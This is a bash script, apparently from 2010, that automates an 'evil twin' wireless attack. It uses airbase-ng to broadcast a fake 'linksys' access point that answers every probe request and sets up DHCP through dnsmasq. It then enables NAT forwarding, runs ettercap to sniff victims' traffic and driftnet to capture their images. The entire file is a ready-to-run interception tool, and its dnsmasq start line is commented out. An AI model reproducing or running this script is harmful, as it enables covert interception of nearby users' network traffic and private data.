#!/bin/bash
 
# Copyright (c) 2010, Insomnia 24/7 All rights reserved.
 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
 
# Redistributions of source code must retain the above copyright notice, this
# list of conditions and the following disclaimer. Redistributions in binary
# form must reproduce the above copyright notice, this list of conditions and
# the following disclaimer in the documentation and/or other materials
# provided with the distribution. Neither the name of Insomnia 24/7 nor
# the names of its contributors may be used to endorse or promote products
# derived from this software without specific prior written permission.
 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR
# ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
# LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
# OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH
# DAMAGE.
 
# This script needs aircrack-ng suite version 1.0 or better
# v1.0 RC1 that comes with Backtrack 3 will NOT work unless updated!
 
# Define variable defaults
BCAST="ath0"
GWAY="eth0"
WAIT="3"
NEEDROOT="1"
CHECKAPPS="1"
APPS=(xterm dnsmasq airbase-ng ettercap driftnet)
 
# Cleanup for premature script end
trap bashtrap INT
 
bashtrap(){
    echo ""
    echo "Stopped by user!"
    exit 1
}
 
# Put arguements into array
ARGS=("$@")
 
# Parse arguments
for (( i=0;i<$#;i++)); do
    if [ ${ARGS[${i}]} == "--help" ] || [ ${ARGS[${i}]} == "-h" ]; then
        echo "Options:"
        echo "  -b [interface]  : Broadcast interface, used to fake accesspoint on."
        echo "  -g [interface]  : Gateway interface, used to forward traffic to."
        echo "  -t [seconds]    : Timeout value, how long we wait for an application to start."
        echo "  -r              : Do not check if I am root."
        echo "  -c              : Do not check if needed applications are installed."
        exit 0
    elif [ ${ARGS[${i}]} == "-b" ]; then
        ((i++))
        BCAST=${ARGS[${i}]}
    elif [ ${ARGS[${i}]} == "-g" ]; then
        ((i++))
        GWAY=${ARGS[${i}]}
    elif [ ${ARGS[${i}]} == "-t" ]; then
        ((i++))
        WAIT=${ARGS[${i}]}
    elif [ ${ARGS[${i}]} == "-r" ]; then
        NEEDROOT="0"
    elif [ ${ARGS[${i}]} == "-c" ]; then
        CHECKAPPS="0"
    else
        echo "else"
    fi
done
 
echo "Broadcast interface set to ${BCAST}"
echo "Gateway interface set to ${GWAY}"
echo "Delay set to ${WAIT}"
 
# Check permissions
if [ $NEEDROOT == 1 ]; then
    if [[ $EUID -ne 0 ]]; then
        echo "You are not root! Quiting"
        exit 1
    fi
else
    echo ""
    echo "Skipping root check, application may not run!"
fi
 
# Check if dependencies are installed
if [ $CHECKAPPS == 1 ]; then
    echo ""
    echo "Checking for needed applications..."
    for app in ${APPS[@]}
    do
        if which $app  >/dev/null; then
            echo "${app} [ OK ]"
        else
            echo "${app} [ NOT FOUND ]"
            exit 1
        fi
    done
else
    echo ""
    echo "Skipping applications check, needed applications may not be installed!"
fi
 
# killing running instances
echo ""
echo "Killing instances of running apps..."
for APP in ${APPS[@]}
do
    killall -9 $APP
done
 
# dnsmasq config
if [ -f /etc/dnsmasq.conf ]; then
    echo "Creating backup of /etc/dnsmasq.conf"
    mv /etc/dnsmasq.conf /etc/dnsmasq.conf.bak
fi
 
echo ""
echo "Writing dnsmasq.conf"
echo "dhcp-range=10.0.0.2,10.0.0.254,2h" >> /etc/dnsmasq.conf
 
echo ""
echo "Starting airbase"
modprobe tun
xterm -e airbase-ng -e "linksys" -P -C 10 -0 $BCAST &
sleep $WAIT
 
# Create interfce to use
echo ""
echo "Creating extra interface at0"
ifconfig at0 10.0.0.1 netmask 255.255.255.0 up
sleep $WAIT
 
# Start dnsmasq
echo ""
echo "Starting dnsmasq"
#/etc/init.d/dnsmasq start
 
# Enable forwarding
echo ""
echo "Enabling forwarding of connections"
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o $GWAY -j MASQUERADE
sleep $WAIT
 
# Start ettercap
echo ""
echo "Starting ettercap"
xterm -e ettercap -T -i at0 -q &
sleep $WAIT
echo 1 > /proc/sys/net/ipv4/ip_forward
 
# Start driftnet
echo ""
echo "Starting driftnet"
driftnet -i at0
 